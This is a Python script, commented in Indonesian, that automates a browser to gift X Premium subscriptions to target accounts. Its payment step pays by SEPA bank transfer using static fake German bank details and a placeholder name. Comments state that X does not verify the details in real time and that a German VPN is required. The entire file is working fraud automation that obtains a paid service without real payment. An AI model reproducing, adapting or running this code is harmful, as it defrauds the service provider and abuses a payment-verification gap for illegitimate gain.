"""Core gift exploit flow — simple automated X Premium gifting via SEPA bank transfer.

SIMPLE FLOW:
1. Login Akun A (premium)
2. Buka profil Akun B (target)
3. Klik 🎁 → pilih durasi (3/6/12 bulan)
4. Di halaman pembayaran, pilih Bank Transfer (SEPA)
5. Isi detail bank Jerman (statis — gak perlu SMS service)
6. Submit → invoice muncul
7. Akun B auto-upgrade dalam 1-5 menit 🗿
"""

import asyncio
import logging
import os
from datetime import datetime
from pathlib import Path
from config import DURATIONS
from xploit.browser import create_browser, login_x, safe_close

logger = logging.getLogger(__name__)

SCREENSHOT_DIR = Path(__file__).parent / "screenshots"

# German bank details — cukup isi yg valid, X gak verifikasi real-time
GERMAN_BANK = {
    "bank_name": "Deutsche Bank",
    "iban": "DE89370400440532013000",
    "bic": "DEUTDEFFXXX",
    "recipient": "Max Mustermann",
}

async def run_gift(target_username: str, user_id: int, duration: str = "12") -> dict:
    """Execute the gift exploit."""
    browser = None
    result = {"success": False, "error": "", "screenshot": ""}
    
    try:
        SCREENSHOT_DIR.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        ss_path = str(SCREENSHOT_DIR / f"gift_{user_id}_{ts}.png")
        
        logger.info("Starting gift flow: target=@%s duration=%s", target_username, duration)
        browser = await create_browser(headless=True)
        page = await browser.get("https://x.com/login")
        
        # 1. Login
        logger.info("Attempting login...")
        if not await login_x(browser, page):
            result["error"] = "Login gagal — periksa kredensial Akun A"
            logger.error("Login failed")
            return result
        
        logger.info("Login OK, navigating to target...")
        await page.sleep(3)
        
        # 2. Buka profil target
        target = target_username.lstrip("@")
        await page.get(f"https://x.com/{target}")
        await page.sleep(5)
        
        # 3. Klik gift icon
        logger.info("Looking for gift button...")
        if not await _click_gift(page):
            result["error"] = "Tombol gift tidak ditemukan — Akun A mungkin tidak premium"
            logger.error("Gift button not found")
            return result
        
        logger.info("Gift button clicked, selecting duration...")
        await page.sleep(5)
        
        # 4. Pilih durasi
        if not await _select_duration(page, duration):
            result["error"] = f"Gagal memilih durasi {duration} bulan"
            logger.error("Duration selection failed")
            return result
        
        logger.info("Duration selected, choosing payment method...")
        await page.sleep(5)
        
        # 5. Pilih Bank Transfer
        if not await _select_bank_payment(page):
            result["error"] = "Opsi Bank Transfer tidak muncul — pastikan VPN Jerman aktif"
            logger.error("Bank payment option not found")
            return result
        
        logger.info("Bank payment selected, filling form...")
        await page.sleep(5)
        
        # 6. Isi detail bank
        await _fill_bank_form(page)
        await page.sleep(3)
        
        # 7. Submit
        logger.info("Submitting...")
        await _click_continue(page)
        await page.sleep(8)
        
        # 8. Screenshot
        os.makedirs(os.path.dirname(ss_path), exist_ok=True)
        await page.save_screenshot(ss_path)
        result["screenshot"] = ss_path
        
        logger.info("Gift flow completed successfully!")
        result["success"] = True
        return result
        
    except Exception as e:
        logger.exception("Gift flow crashed")
        result["error"] = str(e)
        return result
    finally:
        if browser:
            await safe_close(browser)


async def _click_gift(page) -> bool:
    """Klik ikon hadiah."""
    # Coba berbagai selector
    selectors = [
        "[aria-label*='Gift']", "[aria-label*='gift']",
        "[data-testid*='gift']", "[data-testid='subscriptionButton']",
    ]
    for sel in selectors:
        btn = await page.query_selector(sel)
        if btn:
            await btn.click()
            return True
    
    # Scan semua button
    for btn in await page.query_selector_all("div[role='button']"):
        text = (await btn.text_content() or "").lower()
        if any(w in text for w in ["gift", "hadiah", "🎁"]):
            await btn.click()
            return True
    return False

async def _select_duration(page, duration: str) -> bool:
    """Pilih durasi 3/6/12 bulan."""
    label = DURATIONS.get(duration, "12 Months")
    
    for el in await page.query_selector_all("div[role='button'], button, span, label"):
        text = (await el.text_content() or "")
        if label.lower() in text.lower() or f"{duration} month" in text.lower():
            await el.click()
            return True
    
    # Fallback: klik tombol pertama
    first = await page.query_selector("div[role='button']")
    if first:
        await first.click()
        return True
    return False

async def _select_bank_payment(page) -> bool:
    """Pilih Bank Transfer sebagai metode pembayaran."""
    keywords = ["bank transfer", "bank", "sepa", "uberweisung", "überweisung",
                "lastschrift", "bank account", "giropay"]
    
    for el in await page.query_selector_all("div[role='radio'], label, div[role='button'], button"):
        text = (await el.text_content() or "").lower()
        if any(kw in text for kw in keywords):
            await el.click()
            return True
    return False

async def _fill_bank_form(page) -> None:
    """Isi form bank dengan data Jerman statis."""
    mapping = {
        "bank name": GERMAN_BANK["bank_name"],
        "bankinstitut": GERMAN_BANK["bank_name"],
        "iban": GERMAN_BANK["iban"],
        "bic": GERMAN_BANK["bic"],
        "swift": GERMAN_BANK["bic"],
        "account holder": GERMAN_BANK["recipient"],
        "kontoinhaber": GERMAN_BANK["recipient"],
        "recipient": GERMAN_BANK["recipient"],
        "empfänger": GERMAN_BANK["recipient"],
        "first name": "Max",
        "vorname": "Max",
        "last name": "Mustermann",
        "nachname": "Mustermann",
        "address": "Hauptstraße 42",
        "adresse": "Hauptstraße 42",
        "street": "Hauptstraße 42",
        "straße": "Hauptstraße 42",
        "city": "Berlin",
        "stadt": "Berlin",
        "ort": "Berlin",
        "zip": "10115",
        "plz": "10115",
        "postal": "10115",
    }
    
    for inp in await page.query_selector_all("input"):
        name = (await inp.get_attribute("name") or "").lower()
        autocomplete = (await inp.get_attribute("autocomplete") or "").lower()
        placeholder = (await inp.get_attribute("placeholder") or "").lower()
        
        inp_id = await inp.get_attribute("id")
        label = ""
        if inp_id:
            lel = await page.query_selector(f"label[for='{inp_id}']")
            if lel:
                label = (await lel.text_content() or "").lower()
        
        search = f"{name} {autocomplete} {placeholder} {label}"
        for kw, val in mapping.items():
            if kw in search:
                try:
                    await inp.fill(val)
                except:
                    pass
                break

async def _click_continue(page) -> bool:
    """Klik tombol continue/submit."""
    for btn in await page.query_selector_all("div[role='button'], button"):
        text = (await btn.text_content() or "").lower()
        if any(kw in text for kw in ["continue", "submit", "weiter", "confirm", "pay", "bezahlen"]):
            await btn.click()
            return True
    return False
